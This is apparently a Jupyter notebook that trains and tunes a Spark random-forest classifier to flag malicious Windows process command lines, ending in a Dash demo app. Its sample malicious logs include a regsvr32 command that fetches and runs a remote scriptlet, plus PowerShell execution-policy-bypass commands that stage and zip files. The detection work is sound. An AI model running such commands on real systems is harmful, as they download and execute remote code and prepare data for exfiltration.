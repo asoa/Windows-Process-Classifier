{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pyspark.conf import SparkConf\n",
    "from pyspark.sql import SparkSession\n",
    "import pyspark.sql.functions as F\n",
    "import pyspark.sql.types as T\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import matplotlib.pyplot as plt\n",
    "from pyspark.ml import feature, evaluation, Pipeline\n",
    "from pyspark.ml.classification import RandomForestClassifier\n",
    "from pyspark.ml.evaluation import BinaryClassificationEvaluator\n",
    "from pyspark.ml.tuning import CrossValidator, ParamGridBuilder\n",
    "from functools import reduce\n",
    "from pyspark.sql import DataFrame\n",
    "from pyspark.sql import Row"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<pyspark.conf.SparkConf at 0x7f4b39662c18>"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "conf = (SparkConf()\n",
    "            .setAppName('random_forest')\n",
    "            .setMaster('spark://spark-master:7077')\n",
    "       )\n",
    "conf.set(\"spark.executor.memory\", \"6g\")\n",
    "conf.set(\"spark.driver.maxResultSize\", \"0\")\n",
    "conf.set(\"spark.sql.shuffle.partitions\", \"6\")\n",
    "conf.set(\"spark.default.parallelism\", \"6\")\n",
    "conf.set(\"spark.driver.memory\", \"3g\") "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "spark = SparkSession.builder.config(conf=conf).getOrCreate()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# load original dataset without bootstrapped samples\n",
    "df = (spark.read.format('csv')\n",
    "      .option('inferSchema', 'true')\n",
    "      .option('header', 'true')\n",
    "      .option('escape', '\"')\n",
    "      .load('hdfs://namenode:9000/data/no_bootstrap.csv') \n",
    "     )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "52395"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.count()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cleaned dataset from previous model\n",
    "+ regex and split operations transform the string representation of cmd_line_tokens back to an arraytype"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-----------------------------------------------------------------+\n",
      "|cmd_line_tokens                                                  |\n",
      "+-----------------------------------------------------------------+\n",
      "|[svchost.exe, -k, localservicenonetwork, -p]                     |\n",
      "|[svchost.exe, -k, localservice, -p, -s, dispbrokerdesktopsvc]    |\n",
      "|[oobe, windeploy.exe]                                            |\n",
      "|[oobe, setup.exe]                                                |\n",
      "|[svchost.exe, -k, localservicenetworkrestricted, -p, -s, lmhosts]|\n",
      "+-----------------------------------------------------------------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "df = (df.select('*')\n",
    "          .withColumn('class_label', df.class_label.cast(T.DoubleType()))\n",
    "          .withColumn('cmd_line_tokens', F.regexp_replace(F.col('cmd_line_tokens'), r\"(\\[)|(\\]|\\'|\\s+)\", ''))\n",
    "          .withColumn('cmd_line_tokens', F.split(F.col('cmd_line_tokens'), ','))\n",
    "     )\n",
    "df.select('cmd_line_tokens').show(5, False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Data engineering pipelines \n",
    "+ Term Frequency (one-hot): value indicates if feature is present in observation\n",
    "+ Feature has to be present at least once in dataset and in at least 50 documents"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "cv_transformer = feature.CountVectorizer(minTF=1, minDF=50, binary=True, inputCol='cmd_line_tokens', outputCol='tf')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "estimator = Pipeline(stages=[cv_transformer]).fit(df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------------------------------------------------------+---------------------------------------------+\n",
      "|cmd_line_tokens                                                   |tf                                           |\n",
      "+------------------------------------------------------------------+---------------------------------------------+\n",
      "|[svchost.exe, -k, localservicenetworkrestricted, -p, -s, eventlog]|(307,[26,27,60,63,111],[1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, vmware, vmware, tools, vmtoolsd.exe]             |(307,[2,3,144,217],[1.0,1.0,1.0,1.0])        |\n",
      "|[svchost.exe, -k, localsystemnetworkrestricted, -p, -s, trkwks]   |(307,[26,27,60,63,115],[1.0,1.0,1.0,1.0,1.0])|\n",
      "|[svchost.exe, -k, netsvcs, -p, -s, dmwappushservice]              |(307,[26,27,60,63,77],[1.0,1.0,1.0,1.0,1.0]) |\n",
      "|[svchost.exe, -k, netsvcs, -p]                                    |(307,[26,27,60,77],[1.0,1.0,1.0,1.0])        |\n",
      "+------------------------------------------------------------------+---------------------------------------------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "estimator.transform(df).select('cmd_line_tokens','tf').sample(.1).show(5, False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "307"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(estimator.stages[0].vocabulary)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "training_df, validation_df, testing_df = df.randomSplit([0.6, 0.3, 0.1], seed=0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "rf = RandomForestClassifier(featuresCol='tf', labelCol='class_label', maxDepth=6, numTrees=100, \n",
    "                            featureSubsetStrategy='sqrt', impurity='gini', seed=0)\n",
    "rf_estimator = Pipeline(stages=[cv_transformer, rf])\n",
    "rf_model = rf_estimator.fit(training_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Row(accuracy=0.9818806027083731)"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "rf_model.transform(testing_df).\\\n",
    "    select(F.avg(F.expr('float(class_label = prediction)')).alias('accuracy')).\\\n",
    "    first()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DecisionTreeClassificationModel (uid=dtc_291b640318df) of depth 6 with 13 nodes\n",
      "  If (feature 4 <= 0.5)\n",
      "   If (feature 166 <= 0.5)\n",
      "    If (feature 105 <= 0.5)\n",
      "     If (feature 221 <= 0.5)\n",
      "      If (feature 196 <= 0.5)\n",
      "       If (feature 211 <= 0.5)\n",
      "        Predict: 0.0\n",
      "       Else (feature 211 > 0.5)\n",
      "        Predict: 1.0\n",
      "      Else (feature 196 > 0.5)\n",
      "       Predict: 1.0\n",
      "     Else (feature 221 > 0.5)\n",
      "      Predict: 1.0\n",
      "    Else (feature 105 > 0.5)\n",
      "     Predict: 1.0\n",
      "   Else (feature 166 > 0.5)\n",
      "    Predict: 1.0\n",
      "  Else (feature 4 > 0.5)\n",
      "   Predict: 0.0\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(rf_model.stages[-1].trees[3].toDebugString)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Inference"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ The tokens with the most importance all indicate a malicious log and are very similar to the tokens identified in the LR model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>vocab</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>112</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>0.143163</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>110</th>\n",
       "      <td>bypass</td>\n",
       "      <td>0.141431</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>105</th>\n",
       "      <td>-c</td>\n",
       "      <td>0.115930</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>146</th>\n",
       "      <td>/c</td>\n",
       "      <td>0.064762</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>195</th>\n",
       "      <td>reg</td>\n",
       "      <td>0.058177</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>201</th>\n",
       "      <td>hklm</td>\n",
       "      <td>0.044952</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>166</th>\n",
       "      <td>net</td>\n",
       "      <td>0.042444</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>182</th>\n",
       "      <td>foreach</td>\n",
       "      <td>0.041691</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>196</th>\n",
       "      <td>-path</td>\n",
       "      <td>0.030698</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>211</th>\n",
       "      <td>-recurse</td>\n",
       "      <td>0.030654</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>207</th>\n",
       "      <td>-name</td>\n",
       "      <td>0.029789</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>214</th>\n",
       "      <td>-force</td>\n",
       "      <td>0.025899</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>221</th>\n",
       "      <td>currentversion</td>\n",
       "      <td>0.025551</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>184</th>\n",
       "      <td>select-object</td>\n",
       "      <td>0.022846</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>220</th>\n",
       "      <td>-first</td>\n",
       "      <td>0.021023</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>google</td>\n",
       "      <td>0.016871</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>202</th>\n",
       "      <td>/f</td>\n",
       "      <td>0.013909</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>program</td>\n",
       "      <td>0.013630</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>files</td>\n",
       "      <td>0.012587</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>181</th>\n",
       "      <td>/s</td>\n",
       "      <td>0.010861</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                vocab    weight\n",
       "112  -executionpolicy  0.143163\n",
       "110            bypass  0.141431\n",
       "105                -c  0.115930\n",
       "146                /c  0.064762\n",
       "195               reg  0.058177\n",
       "201              hklm  0.044952\n",
       "166               net  0.042444\n",
       "182           foreach  0.041691\n",
       "196             -path  0.030698\n",
       "211          -recurse  0.030654\n",
       "207             -name  0.029789\n",
       "214            -force  0.025899\n",
       "221    currentversion  0.025551\n",
       "184     select-object  0.022846\n",
       "220            -first  0.021023\n",
       "1              google  0.016871\n",
       "202                /f  0.013909\n",
       "2             program  0.013630\n",
       "3               files  0.012587\n",
       "181                /s  0.010861"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "vocab = rf_model.stages[0].vocabulary\n",
    "feature_importance = rf_model.stages[-1].featureImportances.toArray()\n",
    "vocab_importance_df = pd.DataFrame({'vocab': vocab, 'weight': feature_importance})\n",
    "vocab_importance_df.sort_values('weight', ascending=False).head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Model Tuning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "paramGrid = (ParamGridBuilder() \n",
    "                 .addGrid(rf_model.stages[0].minDF, [10, 25, 50]) \n",
    "                 .addGrid(rf_model.stages[1].numTrees, [100, 150, 200]) \n",
    "                 .addGrid(rf_model.stages[1].maxDepth, [10,15,20])\n",
    "                 .build()\n",
    "            )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fitting model 0\n",
      "Fitting model 1\n",
      "Fitting model 2\n",
      "Fitting model 3\n",
      "Fitting model 4\n",
      "Fitting model 5\n",
      "Fitting model 6\n",
      "Fitting model 7\n",
      "Fitting model 8\n",
      "Fitting model 9\n",
      "Fitting model 10\n",
      "Fitting model 11\n",
      "Fitting model 12\n",
      "Fitting model 13\n",
      "Fitting model 14\n",
      "Fitting model 15\n",
      "Fitting model 16\n",
      "Fitting model 17\n",
      "Fitting model 18\n",
      "Fitting model 19\n",
      "Fitting model 20\n",
      "Fitting model 21\n",
      "Fitting model 22\n",
      "Fitting model 23\n",
      "Fitting model 24\n",
      "Fitting model 25\n",
      "Fitting model 26\n"
     ]
    }
   ],
   "source": [
    "models = []\n",
    "for grid in range(len(paramGrid)):\n",
    "    print(\"Fitting model {}\".format(grid))\n",
    "    _model = rf_estimator.fit(validation_df, paramGrid[grid])\n",
    "    models.append(_model)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "evaluator = BinaryClassificationEvaluator(labelCol='class_label', metricName='areaUnderROC')\n",
    "auc_scores = [evaluator.evaluate(model.transform(validation_df)) for model in models]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[0.9838484458608011,\n",
       " 0.9860924907369966,\n",
       " 0.9893028032340578,\n",
       " 0.9839856864261733,\n",
       " 0.9857787770249302,\n",
       " 0.9910670938854773,\n",
       " 0.9823591506249,\n",
       " 0.9885706086545605,\n",
       " 0.9899490387870639,\n",
       " 0.9812327935008511,\n",
       " 0.9876962510697124,\n",
       " 0.9904147603844382,\n",
       " 0.9849219785916473,\n",
       " 0.987159264296529,\n",
       " 0.9906935027318806,\n",
       " 0.9841548861167796,\n",
       " 0.9890053262269952,\n",
       " 0.9896885902837206,\n",
       " 0.9831113288413252,\n",
       " 0.9879141608753302,\n",
       " 0.9885881678061258,\n",
       " 0.9821011266069194,\n",
       " 0.9870830766807415,\n",
       " 0.9886321024196658,\n",
       " 0.9832488632837112,\n",
       " 0.9884854577898569,\n",
       " 0.9886340126202544]"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "auc_scores"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best params: \n",
      "\n",
      "{Param(parent='CountVectorizer_de7d071f2136', name='minDF', doc='Specifies the minimum number of different documents a term must appear in to be included in the vocabulary. If this is an integer >= 1, this specifies the number of documents the term must appear in; if this is a double in [0,1), then this specifies the fraction of documents. Default 1.0'): 10.0, Param(parent='RandomForestClassifier_b71b3957b9aa', name='numTrees', doc='Number of trees to train (>= 1)'): 150, Param(parent='RandomForestClassifier_b71b3957b9aa', name='maxDepth', doc='Maximum depth of the tree. (>= 0) E.g., depth 0 means 1 leaf node; depth 1 means 1 internal node + 2 leaf nodes.'): 20}\n",
      "\n",
      "Best Validation AUC: \n",
      "\n",
      "0.9910670938854773\n"
     ]
    }
   ],
   "source": [
    "best_model_idx = np.argmax(auc_scores)\n",
    "best_model = models[best_model_idx]\n",
    "print(\"Best params: \\n\\n{}\\n\".format(paramGrid[best_model_idx]))\n",
    "print(\"Best Validation AUC: \\n\\n{}\".format(auc_scores[best_model_idx]))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Best model\n",
    "+ minDF: 10\n",
    "+ numTrees: 150\n",
    "+ maxDepth: 20"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>vocab</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>112</th>\n",
       "      <td>bypass</td>\n",
       "      <td>0.081502</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>154</th>\n",
       "      <td>/c</td>\n",
       "      <td>0.077731</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>109</th>\n",
       "      <td>-c</td>\n",
       "      <td>0.072469</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>116</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>0.065573</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>164</th>\n",
       "      <td>net</td>\n",
       "      <td>0.038264</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>217</th>\n",
       "      <td>reg</td>\n",
       "      <td>0.032583</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>183</th>\n",
       "      <td>-path</td>\n",
       "      <td>0.026134</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>243</th>\n",
       "      <td>-name</td>\n",
       "      <td>0.024519</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>273</th>\n",
       "      <td>/i</td>\n",
       "      <td>0.023925</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>312</th>\n",
       "      <td>wmic</td>\n",
       "      <td>0.023159</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>192</th>\n",
       "      <td>foreach</td>\n",
       "      <td>0.023088</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>226</th>\n",
       "      <td>hklm</td>\n",
       "      <td>0.023007</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>208</th>\n",
       "      <td>-recurse</td>\n",
       "      <td>0.021281</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>374</th>\n",
       "      <td>.zip</td>\n",
       "      <td>0.020517</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>353</th>\n",
       "      <td>echo</td>\n",
       "      <td>0.019703</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>244</th>\n",
       "      <td>iex</td>\n",
       "      <td>0.018878</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>248</th>\n",
       "      <td>new-object</td>\n",
       "      <td>0.018615</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>187</th>\n",
       "      <td>/s</td>\n",
       "      <td>0.018322</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>189</th>\n",
       "      <td>select-object</td>\n",
       "      <td>0.014434</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>375</th>\n",
       "      <td>net.webclient</td>\n",
       "      <td>0.014290</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                vocab    weight\n",
       "112            bypass  0.081502\n",
       "154                /c  0.077731\n",
       "109                -c  0.072469\n",
       "116  -executionpolicy  0.065573\n",
       "164               net  0.038264\n",
       "217               reg  0.032583\n",
       "183             -path  0.026134\n",
       "243             -name  0.024519\n",
       "273                /i  0.023925\n",
       "312              wmic  0.023159\n",
       "192           foreach  0.023088\n",
       "226              hklm  0.023007\n",
       "208          -recurse  0.021281\n",
       "374              .zip  0.020517\n",
       "353              echo  0.019703\n",
       "244               iex  0.018878\n",
       "248        new-object  0.018615\n",
       "187                /s  0.018322\n",
       "189     select-object  0.014434\n",
       "375     net.webclient  0.014290"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "vocab = best_model.stages[0].vocabulary\n",
    "feature_importance = best_model.stages[-1].featureImportances.toArray()\n",
    "best_vocab_importance_df = pd.DataFrame({'vocab': vocab, 'weight': feature_importance})\n",
    "best_vocab_importance_df.sort_values('weight', ascending=False).head(20)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DecisionTreeClassificationModel (uid=dtc_2cb7dd58408f) of depth 19 with 43 nodes\n",
      "  If (feature 410 <= 0.5)\n",
      "   If (feature 116 <= 0.5)\n",
      "    If (feature 206 <= 0.5)\n",
      "     If (feature 2 <= 0.5)\n",
      "      If (feature 192 <= 0.5)\n",
      "       If (feature 274 <= 0.5)\n",
      "        If (feature 15 <= 0.5)\n",
      "         If (feature 159 <= 0.5)\n",
      "          If (feature 199 <= 0.5)\n",
      "           If (feature 164 <= 0.5)\n",
      "            If (feature 23 <= 0.5)\n",
      "             If (feature 353 <= 0.5)\n",
      "              If (feature 14 <= 0.5)\n",
      "               If (feature 273 <= 0.5)\n",
      "                If (feature 141 <= 0.5)\n",
      "                 If (feature 283 <= 0.5)\n",
      "                  If (feature 154 <= 0.5)\n",
      "                   If (feature 115 <= 0.5)\n",
      "                    If (feature 307 <= 0.5)\n",
      "                     Predict: 0.0\n",
      "                    Else (feature 307 > 0.5)\n",
      "                     Predict: 1.0\n",
      "                   Else (feature 115 > 0.5)\n",
      "                    Predict: 0.0\n",
      "                  Else (feature 154 > 0.5)\n",
      "                   Predict: 1.0\n",
      "                 Else (feature 283 > 0.5)\n",
      "                  Predict: 1.0\n",
      "                Else (feature 141 > 0.5)\n",
      "                 Predict: 0.0\n",
      "               Else (feature 273 > 0.5)\n",
      "                Predict: 1.0\n",
      "              Else (feature 14 > 0.5)\n",
      "               Predict: 0.0\n",
      "             Else (feature 353 > 0.5)\n",
      "              Predict: 1.0\n",
      "            Else (feature 23 > 0.5)\n",
      "             Predict: 0.0\n",
      "           Else (feature 164 > 0.5)\n",
      "            Predict: 1.0\n",
      "          Else (feature 199 > 0.5)\n",
      "           If (feature 312 <= 0.5)\n",
      "            Predict: 0.0\n",
      "           Else (feature 312 > 0.5)\n",
      "            Predict: 1.0\n",
      "         Else (feature 159 > 0.5)\n",
      "          Predict: 1.0\n",
      "        Else (feature 15 > 0.5)\n",
      "         If (feature 39 <= 0.5)\n",
      "          Predict: 1.0\n",
      "         Else (feature 39 > 0.5)\n",
      "          Predict: 0.0\n",
      "       Else (feature 274 > 0.5)\n",
      "        Predict: 1.0\n",
      "      Else (feature 192 > 0.5)\n",
      "       Predict: 1.0\n",
      "     Else (feature 2 > 0.5)\n",
      "      Predict: 0.0\n",
      "    Else (feature 206 > 0.5)\n",
      "     Predict: 1.0\n",
      "   Else (feature 116 > 0.5)\n",
      "    Predict: 1.0\n",
      "  Else (feature 410 > 0.5)\n",
      "   Predict: 1.0\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(best_model.stages[-1].trees[4].toDebugString)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cross Validation\n",
    "+ test best_model performance on training dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9909516784318434"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "evaluator.evaluate(best_model.transform(testing_df))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Plotly Dash Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "common_strings = ['windows', 'system32', 'cmd.exe', 'sandcat.exe', 'c', 'windowspowershell', 'powershell.exe', '']\n",
    "\n",
    "import re\n",
    "def demo_clean_input(s):\n",
    "    pattern = re.compile(r\"\"\"\n",
    "        [:|\"?']\n",
    "        | --field-trial-handle=.*\\d+\n",
    "        | //.*com(/.*)/\n",
    "        | \\s*\"\\s*\n",
    "        | \\{.*\\}\n",
    "        | [=;(),]\n",
    "        | \\\\\n",
    "        | //\n",
    "        | \\s+\\.\\s+ \n",
    "        | $.\n",
    "        | $_.\n",
    "    \"\"\", re.VERBOSE)\n",
    "    \n",
    "    return ','.join([x.lower() for x in re.sub(pattern, ' ', s).split() if x.lower() not in common_strings and len(x) >= 2])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_coefs(tokens):\n",
    "    \"\"\" get the coefficient for tokens passed from GUI and returns as string \"\"\"\n",
    "    \n",
    "    _format = \"{}: *{}*\\n\"\n",
    "    s = \"\"\n",
    "\n",
    "    token_coefs = []\n",
    "    for token in tokens.split(','):\n",
    "        try:\n",
    "            weight = round(vocab_importance_df.loc[vocab_importance_df.loc[:, 'vocab'] == token, 'weight'].values[0], 6)\n",
    "            s += _format.format(token, weight)\n",
    "        except:\n",
    "            weight = 0.0  # token is not in vocabulary, therefore return 0 for weight\n",
    "            s += _format.format(token, weight)   \n",
    "    return s\n",
    "\n",
    "# get_coefs('cmd.exe,/c,/t')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "def spark_code(s):\n",
    "    \"\"\" tokenizes the input and calls the existing feature and prediction pipelines to transform the input \"\"\"\n",
    "    \n",
    "    # create tokens\n",
    "    tokens = demo_clean_input(s)\n",
    "    print(tokens)\n",
    "    \n",
    "    # create dataframe\n",
    "    _schema = T.StructType([\n",
    "        T.StructField('cmd_line_tokens', T.StringType(), True),\n",
    "    ])         \n",
    "    myrow = Row(cmd_line_tokens=tokens, trusted_path=0, process_name=\"\")\n",
    "    text_df = spark.createDataFrame([myrow], schema=_schema).withColumn('cmd_line_tokens', F.split(F.col('cmd_line_tokens'), r','))\n",
    "    \n",
    "    #transform features using existing pipelines\n",
    "    features = best_model.transform(text_df)\n",
    "    \n",
    "    _features = features.select('cmd_line_tokens').rdd.take(1)[0]['cmd_line_tokens']\n",
    "    prediction = features.select('prediction').rdd.take(1)[0]['prediction']\n",
    "    probability = features.select('probability').rdd.take(1)[0]['probability']\n",
    "    \n",
    "    coefs = get_coefs(tokens)\n",
    "    \n",
    "    result = \"\"\"\n",
    "    Tokens: {} \\n \n",
    "    Probability: {} \\n \n",
    "    Prediction: {} \\n \n",
    "    {}\n",
    "    \"\"\"\n",
    "    \n",
    "    if prediction == 0:\n",
    "        return result.format(_features, probability, prediction, \"*** Benign ***\"), coefs\n",
    "    else:\n",
    "        return result.format(_features, probability, prediction, \"*** Malicious ***\"), coefs\n",
    "                         \n",
    "# spark_code(r'C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc')\n",
    "# spark_code(r'\"powershell.exe -ExecutionPolicy Bypass -C \"\"Compress-Archive -Path C:\\Users\\win10-user3\\staged-DestinationPath C:\\Users\\win10-user3\\staged.zip -Force;ls C:\\Users\\win10-user3\\staged.zip | foreach {$_.FullName} | select')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "import dash\n",
    "import dash_table\n",
    "import dash_core_components as dcc\n",
    "import dash_html_components as html\n",
    "from jupyterlab_dash import AppViewer\n",
    "from dash.dependencies import Input, Output\n",
    "\n",
    "external_stylesheets = ['https://codepen.io/chriddyp/pen/bWLwgP.css']\n",
    "\n",
    "viewer = AppViewer()\n",
    "\n",
    "app = dash.Dash(name=__name__, external_stylesheets=external_stylesheets)\n",
    "\n",
    "markdown_text = '''\n",
    "### Windows process command-line classifier (Random Forest)\n",
    "Please copy and paste your log in the box below\n",
    "'''\n",
    "\n",
    "sample_input_data = r'''\n",
    "### Example malicious logs \n",
    "+ C:\\Windows\\system32\\regsvr32.exe\" /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\n",
    "+ powershell.exe -ExecutionPolicy Bypass -C \"New-Item -Path \\\".\\\" -Name \\\"staged\\\" -ItemType \\\"directory\\\" -Force | foreach {$_.FullName} | Select-Object\"\n",
    "+ cmd.exe /C \"net share\"\n",
    "powershell.exe -ExecutionPolicy Bypass -C \"start powershell.exe -ArgumentList \\\"-NoP\\\",\\\"-StA\\\",\\\"-ExecutionPolicy\\\",\\\"bypass\\\",\\\".\\Emulate-Administrator-Tasks.ps1\\\"\"\n",
    "### Example benign logs \n",
